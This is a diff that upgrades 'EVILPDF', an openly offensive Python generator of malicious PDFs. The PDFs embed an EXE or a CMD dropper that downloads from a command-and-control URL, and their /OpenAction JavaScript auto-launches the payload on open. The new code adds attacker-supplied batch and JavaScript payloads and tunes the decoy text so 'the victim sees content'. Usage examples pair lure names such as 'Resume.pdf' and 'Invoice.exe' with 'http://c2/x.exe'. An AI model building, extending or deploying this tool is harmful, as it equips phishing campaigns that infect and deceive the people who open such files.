@@ -9,15 +9,16 @@
 ███████╗░░╚██╔╝░░██║███████╗  ██║░░░░░██████╔╝██║░░░░░
 ╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═╝░░░░░╚═════╝░╚═╝░░░░░
 
-EVILPDF v4.1 — EXE ➜ EVIL PDF EXPLOIT GENERATOR
+EVILPDF v4.2 — EXE ➜ EVIL PDF EXPLOIT GENERATOR
   • Downloads your EXE from a URL and EMBEDS it inside the PDF
   • /OpenAction JavaScript: opens a new tab, auto-launches the dropper
   • The CMD dropper downloads the EXE from your URL and OPENS it
-  • Import YOUR OWN PDF as the visible document (--decoy)
-  • Custom page text so the victim never sees a blank page
+  • Import YOUR OWN PDF as the visible document (--decoy) + preview it
+  • Custom page text (100-1000 chars enforced) so the victim sees content
   • Rename the embedded file, or auto-detect name from the URL
   • --embed-exe direct mode, --debug object/offset dumps
-  • NEW v4.1: --icon stamps a custom icon INTO the embedded EXE
+  • --icon stamps a custom icon INTO the embedded EXE
+  • NEW v4.2: embed YOUR OWN batch file (--batch) / custom JS (--js)
   • Menu-driven OR full CLI — 100% Python 3 standard library
 
 ⚠ FOR AUTHORIZED SECURITY TESTING / AWARENESS USE ONLY ⚠
@@ -33,7 +34,7 @@ import argparse
 import subprocess
 import urllib.request
 
-__version__ = "4.1"
+__version__ = "4.2"
 
 # ══════════════════════════════════════════════════════════════════
 #  ANSI COLORS — green-on-black hacker style
@@ -80,6 +81,7 @@ BANNER = rf"""{C.LGREEN}{C.BOLD}
   ║ TOOL : EVILPDF v%s — EXE ➜ evil PDF exploit generator       ║
   ║ ON OPEN : new tab ➜ cmd downloads the EXE ➜ EXE opens        ║
   ║ Feat : own PDF decoy / custom text / rename embed / ICON      ║
+  ║ Feat : own batch file / own OpenAction JS file                ║
   ║ USE  : authorized security testing / red team only            ║
   ╚═══════════════════════════════════════════════════════════════╝{C.RESET}
 """ % (__version__, __version__)
@@ -110,6 +112,10 @@ def hr(ch='─', n=64):
 #  HELPERS
 # ══════════════════════════════════════════════════════════════════
 
+TEXT_MIN = 100
+TEXT_MAX = 1000
+
+
 def url_filename(url, default="update.exe"):
     """Extract the exe file name from a URL (auto-detect current name)."""
     try:
@@ -130,9 +136,21 @@ def esc_pdf(text):
                 .encode('latin-1', 'replace').decode('latin-1'))
 
 
+def read_text_file(path):
+    """Read a text file as bytes, tolerating odd encodings."""
+    with open(path, 'rb') as f:
+        raw = f.read()
+    for enc in ('utf-8-sig', 'utf-8', 'cp1252', 'latin-1'):
+        try:
+            return raw.decode(enc), raw
+        except UnicodeDecodeError:
+            continue
+    return raw.decode('latin-1', 'replace'), raw
+
+
 # ══════════════════════════════════════════════════════════════════
-#  v4.1 NEW: ICON STAMPER — writes a .ico into the EXE's PE resources
-# ════════════════════════════════════════════════════════════════════
+#  ICON STAMPER — writes a .ico into the EXE's PE resources
+# ══════════════════════════════════════════════════════════════════
 
 def validate_ico(ico_path):
     """Check the file exists and looks like a real .ico (ICONDIR header)."""
@@ -278,27 +296,29 @@ def apply_icon_to_exe(exe_bytes, ico_path):
 # ══════════════════════════════════════════════════════════════════
 
 class EvilPDF:
-    """EXE ➜ evil PDF exploit generator (v4.1).
+    """EXE ➜ evil PDF exploit generator (v4.2).
 
     On open, /OpenAction JavaScript:
       1) app.launchURL(url, true) -> NEW BROWSER TAB to the EXE URL
       2) exportDataObject(nLaunch: 2) -> launches the embedded dropper
 
-    v4.1: optional --icon stamps a custom .ico into the embedded EXE
-    (embed-exe mode only — the exe bytes are modified BEFORE embedding).
+    v4.2: embed your own batch file (--batch) or supply the whole
+    /OpenAction JavaScript from a file (--js) instead of the built-in.
     """
 
     def __init__(self, exe_url, pdf_name, save_path=".", embed="cmd",
                  decoy_pdf=None, custom_text=None, alias=None, debug=False,
-                 icon=None):
+                 icon=None, batch_file=None, js_file=None):
         self.exe_url   = exe_url.strip()
         self.pdf_name  = pdf_name.strip()
         self.save_path = save_path
-        self.embed     = embed            # "cmd" | "exe" | None (url only)
+        self.embed     = embed            # cmd | exe | url | batch | js
         self.decoy_pdf = decoy_pdf
         self.custom_text = custom_text    # list of lines or None
         self.alias     = alias            # embedded file name or None
-        self.icon      = icon              # .ico file path (embed-exe only)
+        self.icon      = icon             # .ico file path (embed-exe only)
+        self.batch_file = batch_file      # your own batch file (batch mode)
+        self.js_file    = js_file         # your own OpenAction JS (js mode)
         self.exe_data  = None
         self.icon_applied = False
         self.output_file = None
@@ -353,7 +373,20 @@ class EvilPDF:
             status("✓", f"Decoy PDF ready : {C.CYAN}{self.decoy_pdf}{C.RESET} "
                         f"({C.YELLOW}{os.path.getsize(self.decoy_pdf):,}{C.RESET} bytes)")
 
-        # ── v4.1: icon checks ──
+        # ── custom page text length ──
+        if self.custom_text:
+            blob = "\n".join(self.custom_text)
+            n = len(blob)
+            if n > TEXT_MAX:
+                print(f"  {C.RED}[✗] Page text is {n} chars — max is "
+                      f"{TEXT_MAX}!{C.RESET}")
+                return False
+            if n < TEXT_MIN:
+                status("!", f"Page text is only {n} chars (min {TEXT_MIN}) — "
+                            f"the page will look sparse.", C.YELLOW)
+            status("✓", f"Page text       : {C.YELLOW}{n}{C.RESET}/{TEXT_MAX} chars")
+
+        # ── icon checks ──
         if self.icon:
             self.icon = os.path.abspath(os.path.expanduser(self.icon))
             ok, why = validate_ico(self.icon)
@@ -362,13 +395,61 @@ class EvilPDF:
                 return False
             if self.embed != "exe":
                 status("!", f"Icon ignored in '{self.embed}' mode — the icon can "
-                           f"only be stamped into a directly-embedded EXE "
-                           f"(use --embed-exe).", C.YELLOW)
+                            f"only be stamped into a directly-embedded EXE "
+                            f"(use --embed-exe).", C.YELLOW)
                 self.icon = None
             else:
                 size = os.path.getsize(self.icon)
                 status("✓", f"Icon file OK    : {C.CYAN}{self.icon}{C.RESET} "
                             f"({C.YELLOW}{size:,}{C.RESET} bytes)")
+
+        # ── your own batch file ──
+        if self.embed == "batch":
+            if not self.batch_file:
+                print(f"  {C.RED}[✗] batch mode needs a batch file path!{C.RESET}")
+                return False
+            self.batch_file = os.path.abspath(os.path.expanduser(self.batch_file))
+            if not os.path.isfile(self.batch_file):
+                print(f"  {C.RED}[✗] Batch file not found: {self.batch_file}{C.RESET}")
+                return False
+            try:
+                body, raw = read_text_file(self.batch_file)
+            except OSError as e:
+                print(f"  {C.RED}[✗] Cannot read batch file: {e}{C.RESET}")
+                return False
+            if not body.strip():
+                print(f"  {C.RED}[✗] Batch file is empty!{C.RESET}")
+                return False
+            status("✓", f"Batch file OK   : {C.CYAN}{self.batch_file}{C.RESET} "
+                        f"({C.YELLOW}{len(raw):,}{C.RESET} bytes, "
+                        f"{len(body.splitlines())} lines)")
+            if not re.search(r'(?im)^\s*@?echo', body):
+                status("!", "Batch file has no @echo off — the victim may see "
+                            "the command trace.", C.YELLOW)
+
+        # ── your own OpenAction JavaScript ──
+        if self.embed == "js":
+            if not self.js_file:
+                print(f"  {C.RED}[✗] js mode needs a JavaScript file path!{C.RESET}")
+                return False
+            self.js_file = os.path.abspath(os.path.expanduser(self.js_file))
+            if not os.path.isfile(self.js_file):
+                print(f"  {C.RED}[✗] JS file not found: {self.js_file}{C.RESET}")
+                return False
+            try:
+                js_src, _raw = read_text_file(self.js_file)
+            except OSError as e:
+                print(f"  {C.RED}[✗] Cannot read JS file: {e}{C.RESET}")
+                return False
+            if not js_src.strip():
+                print(f"  {C.RED}[✗] JS file is empty!{C.RESET}")
+                return False
+            self.js_src = js_src
+            status("✓", f"JS file OK      : {C.CYAN}{self.js_file}{C.RESET} "
+                        f"({C.YELLOW}{len(js_src):,}{C.RESET} chars)")
+            if "exportDataObject" not in js_src:
+                status("!", "JS has no exportDataObject() call — the embedded "
+                            "dropper will not auto-launch.", C.YELLOW)
 
         # ── resolve embedded file name ──
         self.auto_exe_name = url_filename(self.exe_url)
@@ -376,7 +457,14 @@ class EvilPDF:
             self.embed_name = (self.alias or self.auto_exe_name)
             if self.embed == "exe" and not self.embed_name.lower().endswith('.exe'):
                 self.embed_name += '.exe'
-        else:  # cmd mode
+        elif self.embed == "batch":
+            a = (self.alias or os.path.basename(self.batch_file) or "update.cmd").strip()
+            if a.lower().endswith('.txt'):
+                a = a[:-4]
+            if not (a.lower().endswith('.cmd') or a.lower().endswith('.bat')):
+                a += '.cmd'
+            self.embed_name = a
+        else:  # cmd / js mode
             a = (self.alias or "update.cmd").strip()
             if not (a.lower().endswith('.cmd') or a.lower().endswith('.bat')):
                 a += '.cmd'
@@ -432,8 +520,30 @@ class EvilPDF:
             "endlocal\r\n"
         )
 
+    # ── PAYLOAD BYTES ──────────────────────────────────────────
+    def build_payload(self):
+        if self.embed in ("cmd", "js"):
+            return self.build_cmd_dropper().encode('utf-8')
+        if self.embed == "batch":
+            _body, raw = read_text_file(self.batch_file)
+            raw = raw.replace(b'\r\n', b'\n').replace(b'\r', b'\n')
+            raw = raw.replace(b'\n', b'\r\n')
+            if raw and not raw.endswith(b'\r\n'):
+                raw += b'\r\n'
+            return raw
+        if self.embed == "exe":
+            if self.exe_data is None and not self.download_exe():
+                raise ValueError("could not download EXE for embed")
+            return self.exe_data
+        return b""
+
     # ── /OpenAction JAVASCRIPT ─────────────────────────────────
     def build_javascript(self):
+        # user-supplied JS wins
+        if self.embed == "js" and getattr(self, "js_src", ""):
+            dbg("using user-supplied JavaScript from " + self.js_file)
+            return self.js_src
+
         url_css = self.exe_url.replace('\\', '\\\\').replace('"', '\\"')
         name_css = self.embed_name.replace('\\', '\\\\').replace('"', '\\"')
         if not self.embed:
@@ -462,12 +572,17 @@ try {{
     # ── VISIBLE PAGE CONTENT (custom text support) ────────────
     def build_page_content(self):
         if self.custom_text:
-            lines = [ln for ln in self.custom_text if ln.strip()][:34]
+            lines = [ln for ln in self.custom_text if ln.strip()]
         else:
             lines = ["Document", "",
                      "Please wait while the document loads...",
                      "A security warning may appear if you open this file",
                      "outside of a trusted location. Click Allow to continue."]
+        max_lines = 39                      # fits inside the 612x792 mediabox
+        if len(lines) > max_lines:
+            status("!", f"{len(lines)} text lines — only the first {max_lines} "
+                        f"fit on the page.", C.YELLOW)
+            lines = lines[:max_lines]
         ops, y = [], 712
         for i, ln in enumerate(lines):
             text = ln.strip()
@@ -525,14 +640,7 @@ try {{
             f"root={root_num} pages={pages_ref}")
 
         # -- payload bytes --
-        if self.embed == "cmd":
-            payload = self.build_cmd_dropper().encode('utf-8')
-        elif self.embed == "exe":
-            if self.exe_data is None and not self.download_exe():
-                raise ValueError("could not download EXE for embed")
-            payload = self.exe_data
-        else:
-            payload = b""
+        payload = self.build_payload()
 
         js = self.js_literal(self.build_javascript())
 
@@ -580,12 +688,7 @@ try {{
 
         xref_off = len(out)
         out += f"xref\n{n_cat} {len(new_objs)}\n".encode()
-        for n, off in offsets:
-            out += f"{n} 65535 u \n".encode().replace(b'65535 u', b'00000 n')  # placeholder no-op
-        # (write real xref entries below)
-        out = out[:xref_off]
-        out += f"xref\n{n_cat} {len(new_objs)}\n".encode()
-        for n, off in offsets:
+        for _n, off in offsets:
             out += f"{off:010d} 00000 n \n".encode()
         out += (f"trailer\n<< /Size {base + len(new_objs) + 1} /Root "
                 f"{n_cat} 0 R /Prev {old_xref} >>\n"
@@ -601,15 +704,7 @@ try {{
     def build_scratch(self):
         js = self.js_literal(self.build_javascript())
 
-        # payload
-        if self.embed == "cmd":
-            payload = self.build_cmd_dropper().encode('utf-8')
-        elif self.embed == "exe":
-            if self.exe_data is None and not self.download_exe():
-                raise ValueError("could not download EXE for embed")
-            payload = self.exe_data
-        else:
-            payload = b""
+        payload = self.build_payload()
 
         objs = []
 
@@ -677,7 +772,7 @@ try {{
                 f"startxref\n{xref_off}\n%%EOF\n").encode()
         return bytes(pdf), rows, None
 
-    # ── v4.1: stamp the custom icon into the EXE bytes ────────
+    # ── stamp the custom icon into the EXE bytes ──────────────
     def stamp_icon(self):
         """If an icon was configured, stamp it into self.exe_data."""
         if not self.icon or self.embed != "exe" or self.exe_data is None:
@@ -703,7 +798,7 @@ try {{
                 print("  " + C.RED + "[✗] cannot continue without the EXE" + C.RESET)
                 return False
 
-            # v4.1: stamp the icon BEFORE building the PDF
+            # stamp the icon BEFORE building the PDF
             if self.embed == "exe":
                 self.stamp_icon()
 
@@ -752,16 +847,23 @@ try {{
             row("Embedded file", self.embed_name if self.embed
                                else "None (URL mode only)")
             row("Embed mode", self.embed or "url")
-            row("Icon", self.icon if self.icon_applied
-                      else (self.icon or "none") if self.icon and False
-                      else ("applied: %s" % self.icon if self.icon_applied
-                            else ("FAILED: %s" % self.icon if self.embed == "exe" and self.icon
-                                  else "none")))
+            if self.icon_applied:
+                row("Icon", "applied: " + str(self.icon))
+            elif self.embed == "exe" and self.icon:
+                row("Icon", "FAILED: " + str(self.icon))
+            else:
+                row("Icon", "none")
+            row("Batch source", self.batch_file if self.embed == "batch"
+                               else "built-in dropper")
+            row("JS source", self.js_file if self.embed == "js"
+                            else "built-in")
             row("Victim sees", self.decoy_pdf or
                               ("custom text" if self.custom_text else "default page"))
             row("New tab", "Yes (browser opens EXE URL)")
-            row("Auto-execute", "Yes (exportDataObject nLaunch:2)")
-            row("Downloader", "curl (+ certutil fallback)" if self.embed == "cmd"
+            row("Auto-execute", "Yes (exportDataObject nLaunch:2)"
+                               if self.embed else "tab only")
+            row("Downloader", "your batch file" if self.embed == "batch"
+                             else "curl (+ certutil fallback)" if self.embed in ("cmd", "js")
                              else "direct embed / browser tab")
             hr('═')
             print()
@@ -810,10 +912,128 @@ def ask(prompt, default=None):
     return val or (default or "")
 
 
+def ask_text_block():
+    """Prompt for page text, enforcing TEXT_MIN..TEXT_MAX characters."""
+    print(f"  {C.DIM}Type the text the victim will see. Use | between lines.")
+    print(f"  Allowed length: {TEXT_MIN}-{TEXT_MAX} characters.")
+    print(f"  Empty input cancels.{C.RESET}")
+    while True:
+        raw = input(f"  {C.GREEN}➤{C.RESET}Page text : ").strip()
+        if not raw:
+            status("i", "Page text cancelled — keeping previous value.", C.CYAN)
+            return ""
+        n = len(raw)
+        if n < TEXT_MIN:
+            status("✗", f"Too short: {n} chars, need at least {TEXT_MIN}.", C.RED)
+            continue
+        if n > TEXT_MAX:
+            status("✗", f"Too long: {n} chars, max is {TEXT_MAX}.", C.RED)
+            continue
+        status("✓", f"Accepted: {n}/{TEXT_MAX} characters.", C.GREEN)
+        return raw
+
+
+def ask_existing_file(prompt, exts=None):
+    """Prompt for a path until it exists (and matches exts if given)."""
+    while True:
+        p = ask(prompt + " (empty = cancel)")
+        if not p:
+            return ""
+        p = os.path.abspath(os.path.expanduser(p))
+        if not os.path.isfile(p):
+            status("✗", f"File not found: {p}", C.RED)
+            continue
+        if exts and not p.lower().endswith(tuple(exts)):
+            status("!", f"Unexpected extension — expected {exts[0]}", C.YELLOW)
+        return p
+
+
+def set_decoy(s):
+    p = ask_existing_file("Path to YOUR PDF (victim will see it)")
+    if not p:
+        return
+    try:
+        with open(p, 'rb') as f:
+            if not f.read(8).startswith(b'%PDF-'):
+                status("✗", "That file is not a valid PDF.", C.RED)
+                return
+    except OSError as e:
+        status("✗", f"Cannot read it: {e}", C.RED)
+        return
+    s["decoy"] = p
+    status("✓", f"Decoy set: {C.CYAN}{p}{C.RESET} "
+                f"({C.YELLOW}{os.path.getsize(p):,}{C.RESET} bytes)")
+    if ask("Open it now for review? (y/N)", "n").lower().startswith('y'):
+        open_pdf(p)
+
+
+def choose_embed_mode(s):
+    print(f"""  {C.DIM}embed modes:
+  [1] cmd   = built-in CMD dropper (recommended)
+  [2] exe   = embed the real EXE directly (icon option works here)
+  [3] url   = only open a new tab / no embed
+  [4] batch = embed YOUR OWN batch file from a path
+  [5] js    = load the /OpenAction JavaScript from a text file{C.RESET}""")
+    m = ask("Mode (1-5 or name)", s["embed"])
+    m = m.lower()
+    alias = {"1": "cmd", "2": "exe", "3": "url", "4": "batch", "5": "js"}
+    m = alias.get(m, m)
+    if m == "batch":
+        p = ask_existing_file("Path to your batch file (.bat/.cmd/.txt)",
+                              ('.bat', '.cmd', '.txt'))
+        if not p:
+            status("!", "Batch path not set — mode stays " + s["embed"], C.YELLOW)
+            return
+        try:
+            body, raw = read_text_file(p)
+        except OSError as e:
+            status("✗", f"Cannot read batch file: {e}", C.RED)
+            return
+        if not body.strip():
+            status("✗", "Batch file is empty.", C.RED)
+            return
+        s["batch"] = p
+        status("✓", f"Batch file set: {C.CYAN}{p}{C.RESET} "
+                    f"({C.YELLOW}{len(raw):,}{C.RESET} bytes, "
+                    f"{len(body.splitlines())} lines)")
+        if not re.search(r'(?im)^\s*@?echo', body):
+            status("!", "No @echo off in that file — the victim will see the "
+                        "command trace.", C.YELLOW)
+        s["embed"] = "batch"
+        return
+    if m == "js":
+        p = ask_existing_file("Path to your JavaScript text file (.js/.txt)",
+                              ('.js', '.txt'))
+        if not p:
+            status("!", "JS path not set — mode stays " + s["embed"], C.YELLOW)
+            return
+        try:
+            js_src, _raw = read_text_file(p)
+        except OSError as e:
+            status("✗", f"Cannot read JS file: {e}", C.RED)
+            return
+        if not js_src.strip():
+            status("✗", "JS file is empty.", C.RED)
+            return
+        s["js"] = p
+        status("✓", f"JS file set: {C.CYAN}{p}{C.RESET} "
+                    f"({C.YELLOW}{len(js_src):,}{C.RESET} chars)")
+        if "exportDataObject" not in js_src:
+            status("!", "No exportDataObject() in that file — the embedded "
+                        "dropper will not auto-launch.", C.YELLOW)
+        s["embed"] = "js"
+        return
+    if m in ("cmd", "exe", "url"):
+        s["embed"] = m
+        status("i", f"Embed mode: {C.CYAN}{m}{C.RESET}", C.CYAN)
+    else:
+        status("!", f"Unknown mode: {m}", C.YELLOW)
+
+
 def menu():
     print(BANNER)
     s = {"url": "", "name": "", "out": ".", "decoy": "", "text": "",
-         "alias": "", "embed": "cmd", "icon": ""}
+         "alias": "", "embed": "cmd", "icon": "", "batch": "", "js": ""}
 
     while True:
         hr()
@@ -822,7 +1042,7 @@ def menu():
 {C.GREEN}{C.BOLD} [ 2]{C.RESET} Set evil PDF file name     {C.DIM}(now: {s['name'] or 'not set'}){C.RESET}
 {C.GREEN}{C.BOLD} [ 3]{C.RESET} Set save path              {C.DIM}(now: {s['out']}){C.RESET}
 {C.GREEN}{C.BOLD} [ 4]{C.RESET} MY OWN PDF as victim view   {C.DIM}(decoy: {s['decoy'] or 'not set'}){C.RESET}
-{C.GREEN}{C.BOLD} [ 5]{C.RESET} Custom page text           {C.DIM}({'set' if s['text'] else 'default page'}){C.RESET}
+{C.GREEN}{C.BOLD} [ 5]{C.RESET} Custom page text           {C.DIM}({'set, ' + str(len(s['text'])) + ' chars' if s['text'] else 'default page'}){C.RESET}
 {C.GREEN}{C.BOLD} [ 6]{C.RESET} Rename embedded file       {C.DIM}(auto: name from URL){C.RESET}
 {C.GREEN}{C.BOLD} [ 7]{C.RESET} Embed mode                 {C.DIM}(now: {s['embed']}){C.RESET}
 {C.GREEN}{C.BOLD} [ 8]{C.RESET} Toggle DEBUG mode           {C.DIM}(now: {'ON' if DEBUG[0] else 'off'}){C.RESET}
@@ -842,18 +1062,15 @@ def menu():
         elif ch == "3":
             s["out"] = ask("Save path", s["out"])
         elif ch == "4":
-            s["decoy"] = ask("Path to YOUR PDF (victim will see it)")
+            set_decoy(s)
         elif ch == "5":
-            s["text"] = ask("Lines the victim sees, separated by |")
+            raw = ask_text_block()
+            if raw:
+                s["text"] = raw
         elif ch == "6":
             s["alias"] = ask("Embedded file name (empty = auto from URL)")
         elif ch == "7":
-            print(f"""  {C.DIM}embed modes: cmd = CMD dropper (recommended)
-              exe = embed the real EXE directly (icon option works here)
-              url = only open a new tab / no embed{C.RESET}""")
-            m = ask("Mode (cmd/exe/url)", s["embed"]).lower()
-            if m in ("cmd", "exe", "url"):
-                s["embed"] = m
+            choose_embed_mode(s)
         elif ch == "8":
             DEBUG[0] = not DEBUG[0]
             status("i", f"DEBUG {'ON' if DEBUG[0] else 'OFF'}", C.CYAN)
@@ -864,9 +1081,11 @@ def menu():
   {C.GREEN}►{C.RESET} Name        : {C.CYAN}{s['name'] or '(not set)'}{C.RESET}
   {C.GREEN}►{C.RESET} Save path   : {C.CYAN}{s['out']}{C.RESET}
   {C.GREEN}►{C.RESET} Decoy PDF   : {C.CYAN}{s['decoy'] or '(default page)'}{C.RESET}
-  {C.GREEN}►{C.RESET} Page text   : {C.CYAN}{s['text'] or '(default)'}{C.RESET}
+  {C.GREEN}►{C.RESET} Page text   : {C.CYAN}{(str(len(s['text'])) + ' chars') if s['text'] else '(default)'}{C.RESET}
   {C.GREEN}►{C.RESET} Alias       : {C.CYAN}{s['alias'] or '(auto from URL)'}{C.RESET}
   {C.GREEN}►{C.RESET} Embed mode  : {C.CYAN}{s['embed']}{C.RESET}
+  {C.GREEN}►{C.RESET} Batch file  : {C.CYAN}{s['batch'] or '(built-in dropper)'}{C.RESET}
+  {C.GREEN}►{C.RESET} JS file     : {C.CYAN}{s['js'] or '(built-in)'}{C.RESET}
   {C.GREEN}►{C.RESET} Icon        : {C.CYAN}{s['icon'] or '(none)'}{C.RESET}""")
         elif ch in ("10", "11"):
             url  = s["url"]  or ask("EXE URL")
@@ -877,14 +1096,24 @@ def menu():
             embed = s["embed"] if ch == "10" else "url"
             text = [t for t in s["text"].split('|')] if s["text"] else None
             icon = s["icon"] or None
+            batch = s["batch"] or None
+            jsf = s["js"] or None
             if icon and embed != "exe":
                 status("!", "Icon is only applied in 'exe' embed mode — "
                             "it will be ignored for this run.", C.YELLOW)
+            if embed == "batch" and not batch:
+                status("!", "batch mode selected but no batch file set — "
+                            "switching to cmd mode.", C.YELLOW)
+                embed = "cmd"
+            if embed == "js" and not jsf:
+                status("!", "js mode selected but no JS file set — "
+                            "switching to cmd mode.", C.YELLOW)
+                embed = "cmd"
             gen = EvilPDF(url, name, s["out"], embed=embed,
                          decoy_pdf=(s["decoy"] or None),
                          custom_text=text,
                          alias=(s["alias"] or None),
-                         icon=icon)
+                         icon=icon, batch_file=batch, js_file=jsf)
             if not gen.validate():
                 status("✗", "Invalid input — fix the errors above.", C.RED)
                 continue
@@ -932,7 +1161,9 @@ def cli():
   python3 evilpdf.py -u http://c2/x.exe -n "Resume.pdf" --decoy real_resume.pdf
   python3 evilpdf.py -u http://c2/x.exe -n "Doc.pdf" --text "Bank Statement|Please wait..."
   python3 evilpdf.py -u http://c2/x.exe -n "Doc.pdf" --alias "Invoice.exe" --embed-exe
-  python3 evilpdf.py -u http://c2/x.exe -n "D.pdf" --embed-exe --icon myicon.ico --open --debug
+  python3 evilpdf.py -u http://c2/x.exe -n "D.pdf" --embed-exe --icon myicon.ico --open
+  python3 evilpdf.py -u http://c2/x.exe -n "D.pdf" --batch my_dropper.bat
+  python3 evilpdf.py -u http://c2/x.exe -n "D.pdf" --js my_openaction.js --alias run.cmd
 """)
     p.add_argument('--menu', action='store_true',
                    help='launch the numbered interactive menu (default)')
@@ -942,11 +1173,18 @@ def cli():
     p.add_argument('--decoy', metavar='PDF',
                    help='use YOUR OWN PDF as what the victim sees')
     p.add_argument('--text', default='',
-                   help='custom page text lines, separated by | (no decoy mode)')
+                   help=f'custom page text lines, separated by | '
+                        f'({TEXT_MIN}-{TEXT_MAX} chars, no decoy mode)')
     p.add_argument('--alias', default='',
                    help='rename the embedded file (default: auto from URL)')
     p.add_argument('--embed-exe', action='store_true',
                    help='embed the raw EXE directly (classic nLaunch mode)')
+    p.add_argument('--batch', metavar='FILE', default='',
+                   help='embed YOUR OWN batch file instead of the built-in '
+                        'CMD dropper')
+    p.add_argument('--js', metavar='FILE', default='',
+                   help='load the /OpenAction JavaScript from this text file '
+                        'instead of the built-in script')
     p.add_argument('--url-mode', '--no-embed', action='store_true',
                    help='no embedded file — only open a new tab/download')
     p.add_argument('--icon', metavar='ICO', default='',
@@ -966,13 +1204,24 @@ def cli():
     if args.debug:
         DEBUG[0] = True
 
-    embed = "url" if args.url_mode else ("exe" if args.embed_exe else "cmd")
+    if args.url_mode:
+        embed = "url"
+    elif args.embed_exe:
+        embed = "exe"
+    elif args.batch:
+        embed = "batch"
+    elif args.js:
+        embed = "js"
+    else:
+        embed = "cmd"
+
     text = [t for t in args.text.split('|')] if args.text else None
 
     gen = EvilPDF(args.url, args.name, args.out, embed=embed,
                   decoy_pdf=(args.decoy or None), custom_text=text,
                   alias=(args.alias or None), debug=args.debug,
-                  icon=(args.icon or None))
+                  icon=(args.icon or None), batch_file=(args.batch or None),
+                  js_file=(args.js or None))
 
     print(BANNER)
     print(f"  {C.BOLD}{C.GREEN}[CONFIG]{C.RESET}")
@@ -983,7 +1232,10 @@ def cli():
     cfg("Save Path", args.out)
     cfg("Embed mode", embed)
     cfg("Decoy PDF", args.decoy or "(default page)")
+    cfg("Page text", (str(len(args.text)) + " chars") if args.text else "(default)")
     cfg("Alias", args.alias or "(auto from URL)")
+    cfg("Batch file", args.batch or "(built-in dropper)")
+    cfg("JS file", args.js or "(built-in)")
     cfg("Icon", args.icon or "(none)")
     print(f"  {C.BLUE}{'─' * 58}{C.RESET}\n")
 
